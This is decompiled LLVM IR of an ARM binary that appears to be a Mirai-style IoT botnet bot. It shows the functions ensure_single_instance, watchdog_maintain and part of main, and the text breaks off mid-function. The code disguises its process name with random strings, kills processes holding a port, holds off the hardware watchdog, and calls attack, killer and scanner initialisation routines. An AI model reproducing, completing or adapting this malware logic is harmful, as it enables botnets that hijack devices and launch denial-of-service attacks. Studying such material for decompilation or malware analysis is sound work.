define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_e7a8 = load i32, i32* @r6, align 4
  %v12_e7a8 = load i32, i32* @r7, align 4
  %v15_e7a8 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_23420.121 to i32), i32* @r6, align 4
  %v7_e7cc = icmp eq i32 %v3_e7c4, -1
  store i32 %v3_e7c4, i32* @global_var_23420.121, align 4
  br i1 %v7_e7cc, label %dec_label_pc_e884, label %dec_label_pc_e7d8

dec_label_pc_e7d8:                                ; preds = %entry
  %v2_e7d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e7d8, i32* @r3, align 4
  %v0_e7dc = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_e7ec = call i32 @__GI_setsockopt(i32 %v3_e7c4, i32 %v0_e7dc, i32 2, i32 %v2_e7d8, i32 4)
  %v2_e7f0 = load i32, i32* @global_var_23420.121, align 4
  store i32 %v2_e7f0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_e800 = call i32 @__libc_fcntl(i32 %v2_e7f0, i32 3)
  %v0_e804 = load i32, i32* @r5, align 4
  %v1_e808 = or i32 %v2_e800, 2048
  store i32 %v1_e808, i32* @r2, align 4
  %v0_e80c = load i32, i32* @r4, align 4
  %v2_e810 = call i32 @__libc_fcntl(i32 %v0_e80c, i32 %v0_e804)
  store i32 ptrtoint (i8** @global_var_2342c.123 to i32), i32* @r8, align 4
  %v2_e818 = load i8, i8* bitcast (i8** @global_var_2342c.123 to i8*), align 4
  %v2_e81c = icmp eq i8 %v2_e818, 0
  br i1 %v2_e81c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_e7d8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_e7d8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_e840 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_e848 = inttoptr i32 %v0_e840 to i32*
  store i32 0, i32* %v2_e848, align 4
  %v2_e84c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e84c, i32* @r5, align 4
  store i32 %v0_e840, i32* @r4, align 4
  %v2_e85c = load i32, i32* @global_var_23420.121, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e868 = call i32 @bind(i32 %v2_e85c, i32 %v2_e84c, i32 16)
  %v7_e86c = icmp eq i32 %v3_e868, -1
  br i1 %v7_e86c, label %dec_label_pc_e890, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %bb20
  %v2_e87c = load i32, i32* @global_var_23420.121, align 4
  %v2_e880 = call i32 @listen(i32 %v2_e87c, i32 1)
  br label %dec_label_pc_e884

dec_label_pc_e884:                                ; preds = %entry, %dec_label_pc_e89c, %dec_label_pc_e874
  %v1_e88c = phi i32 [ %v3_e7c4, %entry ], [ %v1_e8e4, %dec_label_pc_e89c ], [ %v2_e880, %dec_label_pc_e874 ]
  store i32 %v9_e7a8, i32* @r6, align 4
  store i32 %v12_e7a8, i32* @r7, align 4
  store i32 %v15_e7a8, i32* @r8, align 4
  ret i32 %v1_e88c

dec_label_pc_e890:                                ; preds = %bb20
  %v0_e890 = load i32, i32* @r4, align 4
  %v1_e890 = inttoptr i32 %v0_e890 to i32*
  %v2_e890 = load i32, i32* %v1_e890, align 4
  %v7_e894 = icmp eq i32 %v2_e890, 99
  br i1 %v7_e894, label %dec_label_pc_e8ec, label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e8ec, %bb21, %dec_label_pc_e890
  %v2_e8b4 = load i32, i32* @global_var_23420.121, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e8c4 = call i32 @__libc_connect(i32 %v2_e8b4, i32 %v2_e84c, i32 16)
  %v1_e8cc = call i32 @sleep(i32 5)
  %v2_e8d0 = load i32, i32* @global_var_23420.121, align 4
  %v1_e8d4 = call i32 @__GI___libc_close(i32 %v2_e8d0)
  %v1_e8e0 = call i32 @killer_kill_by_port(i32 50951)
  %v1_e8e4 = call i32 @ensure_single_instance(i32 %v1_e8e0)
  br label %dec_label_pc_e884

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e890
  %v2_e8ec = load i8, i8* bitcast (i8** @global_var_2342c.123 to i8*), align 4
  %v3_e8ec = zext i8 %v2_e8ec to i32
  %v1_e8f0 = load i32, i32* @r7, align 4
  %v9_e8f0 = icmp eq i32 %v3_e8ec, %v1_e8f0
  br i1 %v9_e8f0, label %dec_label_pc_e89c, label %bb21

bb21:                                             ; preds = %dec_label_pc_e8ec
  %v2_e8f8 = trunc i32 %v1_e8f0 to i8
  store i8 %v2_e8f8, i8* bitcast (i8** @global_var_2342c.123 to i8*), align 4
  br label %dec_label_pc_e89c

; uselistorder directives
  uselistorder i32 %v2_e84c, { 1, 0, 2 }
  uselistorder i32 %v3_e7c4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_2342c.123 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_2342c.123, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e884, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_e90c = load i32, i32* @r4, align 4
  %v6_e90c = load i32, i32* @r5, align 4
  %v9_e90c = load i32, i32* @lr, align 4
  %v0_e914 = call i32 @__libc_fork()
  %v7_e918 = icmp eq i32 %v0_e914, -1
  %. = zext i1 %v7_e918 to i32
  %tmp11 = icmp slt i32 %v0_e914, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_e934 = icmp eq i32 %storemerge4, 0
  store i32 %v0_e914, i32* @global_var_235a4.126, align 4
  br i1 %v2_e934, label %dec_label_pc_e94c, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %entry
  store i32 %v3_e90c, i32* @r4, align 4
  store i32 %v6_e90c, i32* @r5, align 4
  store i32 %v9_e90c, i32* @lr, align 4
  ret i32 %v0_e914

dec_label_pc_e94c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_e958 = call i32 @table_unlock_val(i32 59)
  %v1_e960 = call i32 @table_unlock_val(i32 60)
  %v0_e964 = load i32, i32* @r5, align 4
  %v2_e96c = inttoptr i32 %v0_e964 to i32*
  %v3_e96c = call i32 @table_retrieve_val(i32 59, i32* %v2_e96c)
  %v2_e974 = call i32 @__libc_open(i32 %v3_e96c, i32 2)
  %v7_e978 = icmp eq i32 %v2_e974, -1
  store i32 %v2_e974, i32* @r4, align 4
  br i1 %v7_e978, label %dec_label_pc_e9c0, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e94c
  %v0_e990 = phi i32 [ %v2_e9d0, %dec_label_pc_e9c0 ], [ %v2_e974, %dec_label_pc_e94c ]
  %v2_e994 = ptrtoint i32* %stack_var_-20 to i32
  %v3_e998 = call i32 @ioctl(i32 %v0_e990, i32 -2147199228, i32 %v2_e994)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e99c, %dec_label_pc_e984
  %v0_e9a8 = load i32, i32* @r4, align 4
  %v3_e9b0 = call i32 @ioctl(i32 %v0_e9a8, i32 -2147199227, i32 0)
  %v1_e9b8 = call i32 @sleep(i32 10)
  br label %dec_label_pc_e99c

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e94c
  %v0_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c8 = inttoptr i32 %v0_e9c0 to i32*
  %v3_e9c8 = call i32 @table_retrieve_val(i32 60, i32* %v2_e9c8)
  %v2_e9d0 = call i32 @__libc_open(i32 %v3_e9c8, i32 2)
  %v3_e9d4 = icmp eq i32 %v2_e9d0, -1
  store i32 %v2_e9d0, i32* @r4, align 4
  br i1 %v3_e9d4, label %dec_label_pc_e9e0, label %dec_label_pc_e984

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9c0
  %v1_e9e4 = call i32 @table_lock_val(i32 59)
  %v1_e9ec = call i32 @table_lock_val(i32 60)
  %v0_e9f0 = load i32, i32* @r5, align 4
  %v1_e9f4 = call i32 @__GI_exit(i32 %v0_e9f0)
  %v0_e9f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e9f8, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_e9e0
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_e9e0, %bb14
  ret i32 %v1_e9f4

; uselistorder directives
  uselistorder i32 %v2_e9d0, { 1, 2, 0 }
  uselistorder i32 %v2_e974, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_e914, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 59, { 0, 1, 2, 4, 3 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_ea0c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ea0c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_ea24 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_ea30 = call i32 @__GI_sigaddset(i32 %v2_ea0c, i32 2)
  %v0_ea34 = load i32, i32* @r5, align 4
  store i32 %v0_ea34, i32* %r2.global-to-local, align 4
  %v4_ea40 = call i32 @__GI_sigprocmask(i32 %v0_ea34, i32* nonnull %stack_var_-64, i32 %v0_ea34)
  %v2_ea4c = call i32 @bsd_signal(i32 17, i32 1)
  %v2_ea58 = call i32 @bsd_signal(i32 5, i32 59212)
  %v0_ea5c = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_260c0.116 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_260c4.118, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_ea5c, i32* @global_var_260b8.92, align 4
  store i16 5888, i16* bitcast (i32* @global_var_260c2.119 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_260c0.116 to i16*), align 4
  %v6_ea84 = call i32 @table_init(i32 %v0_ea5c, i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32 ptrtoint (i16** @global_var_260c0.116 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_e764.112 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23428.114 to i32), i32* @lr, align 4
  %v2_ea90 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_ea90, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_e764.112 to i32), i32* @global_var_23428.114, align 4
  %v1_ea98 = call i32 @ensure_single_instance(i32 %v6_ea84)
  %v1_ea9c = call i32 @rand_init(i32 %v1_ea98)
  %v2_eaa8 = call i32 @util_zero(i32 %v2_ea90, i32 32)
  %v0_eaac = load i32, i32* @r6, align 4
  %v7_eaac = icmp eq i32 %v0_eaac, 2
  br i1 %v7_eaac, label %dec_label_pc_ebdc, label %dec_label_pc_eab4

dec_label_pc_eab4:                                ; preds = %dec_label_pc_ebdc, %entry, %dec_label_pc_ebec
  %v0_eab4 = call i32 @rand_next()
  store i32 %v0_eab4, i32* @r6, align 4
  %v0_eabc = load i32, i32* @r8, align 4
  %v1_eabc = inttoptr i32 %v0_eabc to i32*
  %v2_eabc = load i32, i32* %v1_eabc, align 4
  %v1_eac0 = inttoptr i32 %v2_eabc to i8*
  %v2_eac0 = call i32 @util_strlen(i8* %v1_eac0)
  %v0_eac8 = load i32, i32* @r8, align 4
  %v1_eac8 = inttoptr i32 %v0_eac8 to i32*
  %v2_eac8 = load i32, i32* %v1_eac8, align 4
  %v1_eacc = inttoptr i32 %v2_eac8 to i8*
  %v2_eacc = call i32 @util_strlen(i8* %v1_eacc)
  %v1_ead0 = sub i32 20, %v2_eac0
  %v0_ead8 = load i32, i32* @r6, align 4
  %v3_eadc = urem i32 %v0_ead8, %v1_ead0
  %v2_eae0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_eae0, i32* @r5, align 4
  %v2_eae4 = add i32 %v3_eadc, %v2_eacc
  store i32 %v2_eae4, i32* @r4, align 4
  %v2_eaf0 = call i32 @rand_alphastr(i32 %v2_eae0, i32 %v2_eae4)
  %v2_eaf4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_eaf8 = load i32, i32* @r4, align 4
  %v2_eaf8 = add i32 %v1_eaf8, %v2_eaf4
  store i32 %v2_eaf8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_eb04 = load i32, i32* @r8, align 4
  %v1_eb04 = inttoptr i32 %v0_eb04 to i32*
  %v2_eb04 = load i32, i32* %v1_eb04, align 4
  store i32 %v2_eb04, i32* @r0, align 4
  %v3_eb08 = add i32 %v2_eaf8, -80
  %v4_eb08 = inttoptr i32 %v3_eb08 to i8*
  store i8 0, i8* %v4_eb08, align 1
  %v2_eb0c = inttoptr i32 %v2_eb04 to i8*
  %v3_eb0c = call i32 @util_strcpy(i8* %v2_eb0c, i32 %v2_eae0)
  %v2_eb18 = call i32 @util_zero(i32 %v2_eae0, i32 32)
  %v0_eb1c = call i32 @rand_next()
  store i32 %v0_eb1c, i32* @r7, align 4
  %v0_eb24 = load i32, i32* @r8, align 4
  %v1_eb24 = inttoptr i32 %v0_eb24 to i32*
  %v2_eb24 = load i32, i32* %v1_eb24, align 4
  %v1_eb28 = inttoptr i32 %v2_eb24 to i8*
  %v2_eb28 = call i32 @util_strlen(i8* %v1_eb28)
  store i32 %v2_eb28, i32* @r6, align 4
  %v0_eb30 = load i32, i32* @r8, align 4
  %v1_eb30 = inttoptr i32 %v0_eb30 to i32*
  %v2_eb30 = load i32, i32* %v1_eb30, align 4
  %v1_eb34 = inttoptr i32 %v2_eb30 to i8*
  %v2_eb34 = call i32 @util_strlen(i8* %v1_eb34)
  %v0_eb38 = load i32, i32* @r6, align 4
  %v1_eb38 = sub i32 20, %v0_eb38
  %v0_eb40 = load i32, i32* @r7, align 4
  %v3_eb44 = urem i32 %v0_eb40, %v1_eb38
  %v2_eb48 = add i32 %v3_eb44, %v2_eb34
  store i32 %v2_eb48, i32* @r4, align 4
  %v2_eb54 = call i32 @rand_alphastr(i32 %v2_eae0, i32 %v2_eb48)
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v1_eb5c = load i32, i32* @r4, align 4
  %v2_eb5c = add i32 %v1_eb5c, %v2_eaf4
  store i32 %v2_eb5c, i32* %r3.global-to-local, align 4
  %v0_eb60 = load i32, i32* @sl, align 4
  %v1_eb60 = trunc i32 %v0_eb60 to i8
  %v3_eb60 = add i32 %v2_eb5c, -80
  %v4_eb60 = inttoptr i32 %v3_eb60 to i8*
  store i8 %v1_eb60, i8* %v4_eb60, align 1
  %v4_eb6c = call i32 @prctl(i32 15, i32 %v2_eae0, i32 %v2_eaf4, i32 %v2_eb5c)
  %v1_eb74 = call i32 @table_unlock_val(i32 5)
  %v3_eb84 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_eb88 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_eb88, i32* @r2, align 4
  %v2_eb94 = call i32 @__GI___libc_write(i32 1, i32 %v3_eb84)
  store i32 1, i32* @r2, align 4
  %v2_eba4 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1a7b8.134 to i32))
  %v1_ebac = call i32 @table_lock_val(i32 5)
  %v1_ebb0 = call i32 @attack_init(i32 %v1_ebac)
  %v1_ebb4 = call i32 @killer_init(i32 %v1_ebb0)
  %v1_ebb8 = call i32 @watchdog_maintain(i32 %v1_ebb4)
  %v0_ebbc = call i32 @__libc_fork()
  %v1_ebc0 = load i32, i32* @sl, align 4
  %v7_ebc4 = icmp sgt i32 %v0_ebbc, %v1_ebc0
  br i1 %v7_ebc4, label %dec_label_pc_ebc8, label %dec_label_pc_ec14

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_eab4
  ret i32 %v1_ebc0

dec_label_pc_ebdc:                                ; preds = %entry
  %v0_ebdc = load i32, i32* @r8, align 4
  %v1_ebdc = add i32 %v0_ebdc, 4
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  %v3_ebdc = load i32, i32* %v2_ebdc, align 4
  %v1_ebe0 = inttoptr i32 %v3_ebdc to i8*
  %v2_ebe0 = call i32 @util_strlen(i8* %v1_ebe0)
  %v8_ebe8 = icmp sgt i32 %v2_ebe0, 31
  br i1 %v8_ebe8, label %dec_label_pc_eab4, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebdc
  %v0_ebec = load i32, i32* @r8, align 4
  %v1_ebec = add i32 %v0_ebec, 4
  %v2_ebec = inttoptr i32 %v1_ebec to i32*
  %v3_ebec = load i32, i32* %v2_ebec, align 4
  store i32 %v2_ea90, i32* @r0, align 4
  %v2_ebf4 = bitcast i32* %stack_var_-152 to i8*
  %v3_ebf4 = call i32 @util_strcpy(i8* %v2_ebf4, i32 %v3_ebec)
  %v0_ebf8 = load i32, i32* @r8, align 4
  %v1_ebf8 = add i32 %v0_ebf8, 4
  %v2_ebf8 = inttoptr i32 %v1_ebf8 to i32*
  %v3_ebf8 = load i32, i32* %v2_ebf8, align 4
  %v1_ec00 = inttoptr i32 %v3_ebf8 to i8*
  %v2_ec00 = call i32 @util_strlen(i8* %v1_ec00)
  %v2_ec0c = call i32 @util_zero(i32 %v3_ebf8, i32 %v2_ec00)
  br label %dec_label_pc_eab4

dec_label_pc_ec14:                                ; preds = %dec_label_pc_eab4
  %v1_ec14 = call i32 @__GI_setsid(i32 %v0_ebbc)
  %v0_ec1c = load i32, i32* @sl, align 4
  %v1_ec20 = call i32 @__GI___libc_close(i32 %v0_ec1c)
  %v1_ec28 = call i32 @__GI___libc_close(i32 1)
  %v1_ec30 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_23424.136 to i32), i32* @fp, align 4
  %v1_ec38 = call i32 @attack_init(i32 %v1_ec30)
  %v1_ec3c = call i32 @killer_init(i32 %v1_ec38)
  %v1_ec40 = call i32 @watchdog_maintain(i32 %v1_ec3c)
  %v1_ec44 = call i32 @scanner_init(i32 %v1_ec40)
  %v0_ec48 = load i32, i32* @sl, align 4
  %v2_ec4c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ec4c, i32* @r7, align 4
  %v2_ec50 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ec50, i32* @r6, align 4
  %v2_ed30 = ptrtoint i32* %stack_var_-72 to i32
  %v2_ed80 = ptrtoint i32* %stack_var_-168 to i32
  %v2_ef5c = ptrtoint i32* %stack_var_-56 to i32
  %v2_ef64 = ptrtoint i8** %stack_var_-42 to i32
  %v2_f10c = ptrtoint i32* %stack_var_-1432 to i32
  %v2_ef80 = ptrtoint i32* %stack_var_-52 to i32
  %v1_f034 = bitcast i32* %stack_var_-152 to i8*
  %v2_eff4 = ptrtoint i32* %stack_var_-88 to i32
  %v1_f010 = sub i32 0, %v1_ec14
  br label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_f094, %dec_label_pc_f130, %bb44, %dec_label_pc_f030, %dec_label_pc_ee64, %dec_label_pc_ee54, %bb41, %dec_label_pc_f184, %dec_label_pc_f0f0, %dec_label_pc_f0a4, %dec_label_pc_f080, %dec_label_pc_efac, %dec_label_pc_eed4, %dec_label_pc_ee0c, %dec_label_pc_ec14
  %stack_var_-1436.0 = phi i32 [ %v0_ec48, %dec_label_pc_ec14 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_ee54 ], [ %stack_var_-1436.1, %dec_label_pc_ee64 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_f0a4 ], [ %stack_var_-1436.1, %dec_label_pc_eed4 ], [ %stack_var_-1436.1, %dec_label_pc_f130 ], [ %stack_var_-1436.1, %dec_label_pc_f184 ], [ %stack_var_-1436.1, %dec_label_pc_f0f0 ], [ %stack_var_-1436.1, %dec_label_pc_ee0c ], [ %stack_var_-1436.1, %dec_label_pc_f030 ], [ %stack_var_-1436.1, %dec_label_pc_f080 ], [ %stack_var_-1436.1, %dec_label_pc_efac ], [ %stack_var_-1436.1, %dec_label_pc_f094 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ec54
  %v1_ec64 = phi i32 [ %v1_ec68, %dec_label_pc_ec60 ], [ 4, %dec_label_pc_ec54 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ec64 = load i32, i32* @r7, align 4
  %v3_ec64 = add i32 %v2_ec64, %v1_ec64
  %v4_ec64 = inttoptr i32 %v3_ec64 to i32*
  store i32 0, i32* %v4_ec64, align 4
  %v0_ec68 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec68 = add i32 %v0_ec68, 4
  store i32 %v1_ec68, i32* %r3.global-to-local, align 4
  %v7_ec6c = icmp eq i32 %v1_ec68, 128
  br i1 %v7_ec6c, label %dec_label_pc_ec74, label %dec_label_pc_ec60

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec60
  %v0_ec74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ec74, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec7c, %dec_label_pc_ec74
  %v1_ec80 = phi i32 [ %v1_ec84, %dec_label_pc_ec7c ], [ 4, %dec_label_pc_ec74 ]
  store i32 0, i32* @r4, align 4
  %v2_ec80 = load i32, i32* @r6, align 4
  %v3_ec80 = add i32 %v2_ec80, %v1_ec80
  %v4_ec80 = inttoptr i32 %v3_ec80 to i32*
  store i32 0, i32* %v4_ec80, align 4
  %v0_ec84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec84 = add i32 %v0_ec84, 4
  store i32 %v1_ec84, i32* %r3.global-to-local, align 4
  %v7_ec88 = icmp eq i32 %v1_ec84, 128
  br i1 %v7_ec88, label %dec_label_pc_ec90, label %dec_label_pc_ec7c

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec7c
  store i32 ptrtoint (i32* @global_var_23420.121 to i32), i32* %r3.global-to-local, align 4
  %v2_ec94 = load i32, i32* @global_var_23420.121, align 4
  %v7_ec98 = icmp eq i32 %v2_ec94, -1
  br i1 %v7_ec98, label %dec_label_pc_ecc4, label %dec_label_pc_eca0

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec90
  %v3_eca0 = udiv i32 %v2_ec94, 32
  %v3_eca4 = mul nuw nsw i32 %v3_eca0, 4
  store i32 %v2_eaf4, i32* %ip.global-to-local, align 4
  %v2_ecac = add i32 %v3_eca4, %v2_eaf4
  store i32 %v2_ecac, i32* %r3.global-to-local, align 4
  %v1_ecb0 = add i32 %v2_ecac, -240
  %v2_ecb0 = inttoptr i32 %v1_ecb0 to i32*
  %v3_ecb0 = load i32, i32* %v2_ecb0, align 4
  %v1_ecb4 = urem i32 %v2_ec94, 32
  %v7_ecbc = shl i32 1, %v1_ecb4
  %v8_ecbc = or i32 %v3_ecb0, %v7_ecbc
  store i32 %v8_ecbc, i32* %r2.global-to-local, align 4
  store i32 %v8_ecbc, i32* %v2_ecb0, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ec90, %dec_label_pc_eca0
  %v2_ecc4 = load i32, i32* @global_var_23424.136, align 4
  store i32 %v2_ecc4, i32* @r3, align 4
  %v7_ecc8 = icmp eq i32 %v2_ecc4, -1
  store i32 ptrtoint (i32* @global_var_23424.136 to i32), i32* @r8, align 4
  br i1 %v7_ecc8, label %dec_label_pc_eeec, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_eeec, %dec_label_pc_ecc4, %bb43
  %v2_ecd8 = load i8, i8* bitcast (i8** @global_var_235a8.139 to i8*), align 4
  %v2_ecdc = icmp eq i8 %v2_ecd8, 0
  %v2_ee28 = load i32, i32* @global_var_23424.136, align 4
  store i32 %v2_ee28, i32* %ip.global-to-local, align 4
  %v3_ee2c = udiv i32 %v2_ee28, 32
  store i32 %v3_ee2c, i32* %r3.global-to-local, align 4
  br i1 %v2_ecdc, label %dec_label_pc_ee28, label %dec_label_pc_ece4

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ecd4
  %v3_ecf0 = mul nuw nsw i32 %v3_ee2c, 4
  %v2_ecf4 = add i32 %v3_ecf0, %v2_eaf4
  store i32 %v2_ecf4, i32* %r3.global-to-local, align 4
  %v1_ecf8 = add i32 %v2_ecf4, -368
  %v2_ecf8 = inttoptr i32 %v1_ecf8 to i32*
  %v3_ecf8 = load i32, i32* %v2_ecf8, align 4
  %v1_ecfc = urem i32 %v2_ee28, 32
  %v7_ed04 = shl i32 1, %v1_ecfc
  %v8_ed04 = or i32 %v3_ecf8, %v7_ed04
  store i32 %v8_ed04, i32* %r2.global-to-local, align 4
  store i32 %v8_ed04, i32* %v2_ecf8, align 4
  br label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ee28, %dec_label_pc_ece4
  store i32 ptrtoint (i32* @global_var_23420.121 to i32), i32* %r3.global-to-local, align 4
  %v2_ed10 = load i32, i32* @global_var_23420.121, align 4
  store i32 0, i32* @lr, align 4
  %v0_ed18 = load i32, i32* %ip.global-to-local, align 4
  %v5_ed1c = icmp slt i32 %v0_ed18, %v2_ed10
  br i1 %v5_ed1c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_ed0c
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_ed0c, %bb
  %v0_ed2c = phi i32 [ %v2_ed10, %dec_label_pc_ed0c ], [ %v0_ed18, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_ed2c = add i32 %v0_ed2c, 1
  store i32 %v2_ed30, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ec50, i32* %r2.global-to-local, align 4
  %v5_ed48 = call i32 @__libc_select(i32 %v1_ed2c, i32 %v2_ec4c, i32 %v2_ec50, i32 0, i32 %v2_ed30)
  %v8_ed4c = icmp eq i32 %v5_ed48, -1
  br i1 %v8_ed4c, label %dec_label_pc_ec54, label %dec_label_pc_ed54

dec_label_pc_ed54:                                ; preds = %bb41
  %v6_ed48 = trunc i32 %v5_ed48 to i16
  %v3_ed54 = icmp eq i16 %v6_ed48, 0
  br i1 %v3_ed54, label %dec_label_pc_ed5c, label %dec_label_pc_ed90

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed54
  %v5_ed68 = srem i32 %stack_var_-1436.0, 6
  %v4_ed70 = sub i32 %stack_var_-1436.0, %v5_ed68
  store i32 %v4_ed70, i32* %r3.global-to-local, align 4
  %v2_ed78 = icmp eq i32 %v5_ed68, 0
  %v1_ed7c = add i32 %stack_var_-1436.0, 1
  store i32 %v1_ed7c, i32* @lr, align 4
  store i32 %v2_ed80, i32* %r2.global-to-local, align 4
  %v7_ed84 = inttoptr i32 %v5_ed48 to i8*
  store i8* %v7_ed84, i8** %stack_var_-42, align 4
  br i1 %v2_ed78, label %dec_label_pc_ef5c, label %dec_label_pc_ed90

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed54, %dec_label_pc_ed5c, %dec_label_pc_ef5c
  %stack_var_-1436.1 = phi i32 [ %v1_ed7c, %dec_label_pc_ef5c ], [ %v1_ed7c, %dec_label_pc_ed5c ], [ %stack_var_-1436.0, %dec_label_pc_ed54 ]
  store i32 ptrtoint (i32* @global_var_23420.121 to i32), i32* %r3.global-to-local, align 4
  %v2_ed94 = load i32, i32* @global_var_23420.121, align 4
  %v7_ed98 = icmp eq i32 %v2_ed94, -1
  br i1 %v7_ed98, label %dec_label_pc_edc4, label %dec_label_pc_eda0

dec_label_pc_eda0:                                ; preds = %dec_label_pc_ed90
  %v3_eda0 = udiv i32 %v2_ed94, 32
  %v3_eda4 = mul nuw nsw i32 %v3_eda0, 4
